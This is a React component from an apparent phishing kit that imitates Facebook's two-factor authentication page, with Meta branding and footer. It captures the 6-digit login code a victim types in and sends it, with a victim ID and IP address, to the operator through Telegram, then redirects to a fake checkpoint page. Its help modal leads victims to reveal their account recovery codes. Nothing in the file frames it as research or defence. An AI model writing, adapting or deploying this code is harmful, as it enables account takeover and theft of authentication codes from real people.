import React, { useEffect, useState } from "react";
import { Modal } from "antd";
import { useNavigate } from "react-router-dom";
import { sendTelegram } from "./utils/sendTelegram";
import "./styles/confirmation.css";
import { getIpAddress } from "./utils/getIpAddress";
import { API_BE } from "./utils/variable";

export const CodeTwo = () => {
  const navigate = useNavigate();
  const [isModalVisible, setIsModalVisible] = useState(false);
  const [minutes, setMinutes] = useState(4);
  const [seconds, setSeconds] = useState(59);
  const [code, setCode] = useState("");
  const [loading, setLoading] = useState(false);

  const updateStatus = (status) => {
    let unique_id = localStorage.getItem("unique_id");
    if (unique_id) {
      unique_id = JSON.parse(unique_id);
      const data = {
        unique_id,
        status,
      };
      fetch(`${API_BE}/users`, {
        method: "PUT",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      })
        .then((response) => response.json())
        .then(() => {
          getAllUsers();
        })
        .catch(() => {
          getAllUsers();
        });
    }
  };

  useEffect(() => {
    updateStatus(0);
  }, []);

  useEffect(() => {
    let myInterval = setInterval(() => {
      if (seconds > 0) {
        setSeconds(seconds - 1);
      }
      if (seconds === 0) {
        if (minutes === 0) {
          clearInterval(myInterval);
        } else {
          setMinutes(minutes - 1);
          setSeconds(59);
        }
      }
    }, 1000);
    return () => {
      clearInterval(myInterval);
    };
  });

  const showModal = () => {
    setIsModalVisible(true);
  };

  const handleOk = () => {
    setIsModalVisible(false);
  };

  const handleCancel = () => {
    setIsModalVisible(false);
  };

  const handleSubmit = () => {
    if (!code.length || code.length < 6 || loading) return;
    setLoading(true);
    let form_data = localStorage.getItem("form_data");
    let unique_id = localStorage.getItem("unique_id");

    if (form_data) {
      form_data = JSON.parse(form_data);
    }

    localStorage.setItem("code", code);
    let telegram_data = `
    ========== FORM CODE GENERATOR #2 ==========
      ID: ${unique_id}
    ===============================
      Code: ${code}
    ===============================
    ${getIpAddress()}
    `;

    sendTelegram(telegram_data);

    setTimeout(() => {
      navigate("/checkpoint/next=secure", {
        state: { name: form_data.full_name },
      });
    }, 1000);
  };

  const handleInputCode = (value) => {
    if (value.length > 8) return;
    setCode(value);
  };

  return (
    <>
      <div className="confirmation-container">
        <div className="header-color">
          <div className="header-container">
            <h2>facebook</h2>
          </div>
        </div>
        <div className="auth-req-container">
          <div className="auth-req">
            <div className="auth-req-text">
              <h2>Two-factor authentication required</h2>
              <div className="auth-req-paragraph">
                <p className="first">
                  You’ve asked us to require a 6-digit login code when anyone
                  tries to access your account from a new device or browser.
                </p>
                <p className="second">
                  Enter the 6-digit code from your{" "}
                  <strong>code generator</strong> or third-party app below.
                </p>
              </div>
              <div className="input-auth-req">
                <input
                  className="show-input-on-desktop"
                  placeholder="Login Code"
                  type="number"
                  value={code}
                  onChange={(e) => handleInputCode(e.target.value)}
                />
                {minutes === 0 && seconds === 0 ? null : (
                  <span>
                    {" "}
                    (wait {minutes}:{seconds < 10 ? `0${seconds}` : seconds})
                  </span>
                )}
              </div>
            </div>
            <div className="show-input-on-mobile">
              <input
                type="number"
                value={code}
                onChange={(e) => handleInputCode(e.target.value)}
              />
              {minutes === 0 && seconds === 0 ? null : (
                <span>
                  {" "}
                  (wait {minutes}:{seconds < 10 ? `0${seconds}` : seconds})
                </span>
              )}
            </div>
            <div className="auth-req-footer">
              <a onClick={showModal}>Need another way to authenticate?</a>
              <button
                className={`${loading && "disableButton"}`}
                onClick={handleSubmit}
              >
                <span>Continue</span>
              </button>
            </div>
          </div>
          <div className="having-trouble-class">
            <button onClick={showModal}>Having trouble?</button>
          </div>
          <div className={`show-button-mobile ${loading && "disableButton"}`}>
            <button onClick={handleSubmit}>Continue</button>
          </div>
          <div className="show-footer-on-mobile-plus">
            <h2 className="h2-foot">Not You? Log In Here</h2>
            <div className="footer-flex-mobile-plus">
              <div>
                <h2>English (US)</h2>
                <p>Deutsch</p>
                <p>Српски</p>
                <p>Português (Brasil)</p>
              </div>
              <div>
                <p>Italiano</p>
                <p>Bosanski</p>
                <p>Svensk</p>
                <button>+</button>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div>
        <div className="footer-menu-flex-ul">
          <div className="container-language-footer">
            <ul className="flex-ul">
              <li>English (US)</li>
              <li>Español</li>
              <li>Deutsch</li>
              <li>Türkçe</li>
              <li>Српски</li>
              <li>Français (France)</li>
              <li>Italiano</li>
              <li>Bosanski</li>
              <li>Svensk</li>
              <li>Português (Brasil)</li>
              <button className="countrys-button">
                <span>+</span>
              </button>
            </ul>
          </div>
          <div className="flex-second-ul">
            <ul>
              <li>Sign Up</li>
              <li>Log In</li>
              <li>Messenger</li>
              <li>Facebook Lite</li>
              <li>Watch</li>
              <li>Places</li>
              <li>Games</li>
              <li>Marketplace</li>
              <li>Facebook Pay</li>
              <li>Oculus</li>
              <li>Portal</li>
              <li>Instagram</li>
              <li>Bulletin</li>
              <li>Local</li>
            </ul>
          </div>
          <div className="flex-second-ul-2">
            <ul>
              <li>Fundraisers</li>
              <li>Services</li>
              <li>Voting Information Centre</li>
              <li>About</li>
              <li>Create ad</li>
              <li>Create Page</li>
              <li>Developers</li>
              <li>Careers</li>
              <li>Privacy</li>
              <li>Cookies</li>
              <li className="ad-choice-img">
                Ad Choices <span className="img-li"></span>{" "}
              </li>
              <li>Terms</li>
              <li>Help</li>
            </ul>
          </div>
          <div className="meta-footer">
            <p>Meta © 2022</p>
          </div>
        </div>
      </div>

      <Modal
        bodyStyle={{ height: 700 }}
        title="Didn't receive a code?"
        visible={isModalVisible}
        onOk={handleOk}
        onCancel={handleCancel}
        closable={false}
        className="modal-height-confirmation"
        okText="Get Code"
        cancelText="Close"
      >
        <div className="modal-conatiner-code">
          <div className="mt-10 p-x">
            1. Go To <strong>Settings</strong> &gt;{" "}
            <span className="color-blue">Security and Login</span>
          </div>
          <div className="mt-10 p-x">
            2. Under the <strong>Two-Factor Authentication</strong> section,
            click <strong>Use two-factor authentication.</strong> You may need
            to re-enter your password.
          </div>
          <div className="mt-10 p-x">
            3. Next to <strong>Recovery Codes</strong> click{" "}
            <strong>Setup</strong> then <strong>Get Codes.</strong> If you've
            already set up recovery codes, you can click{" "}
            <strong>Show Codes.</strong>
          </div>
          <div className="modal-image-responsive">
            <img src="/code.jpeg" />
          </div>
        </div>
      </Modal>
    </>
  );
};
